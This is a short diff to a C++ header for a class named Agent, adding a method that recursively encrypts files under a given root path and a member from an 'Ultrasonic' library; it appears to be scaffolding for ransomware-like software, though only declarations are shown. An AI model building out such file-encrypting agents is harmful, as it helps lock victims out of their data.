@@ -1,6 +1,9 @@
 #pragma once
 
+#include "Ultrasonic.h"
+
 #include <filesystem>
+
 
 class Agent final
 {
@@ -11,8 +14,8 @@ public:
 	// dtor
 	~Agent() = default;
 
-	// Executes the agent logic
-	// param[in]	encryption_root_path	root path for the files encryption
+	// Executes the agent logic.
+	// param[in]	encryption_root_path	root path for the files encryption.
 	void execute(const std::filesystem::path& encryption_root_path);
 
 	// Deleted functions
@@ -23,6 +26,11 @@ public:
 	
 private:
 
+	// Encrypt the files in the directory recursively.
+	// param[in]	encryption_root_path	root path for the files encryption.
+	void encrypt_directory(const std::filesystem::path& encryption_root_path);
+	
 	// Members
+	ultrasonic::Ultrasonic m_ultrasonic;
 	
 };
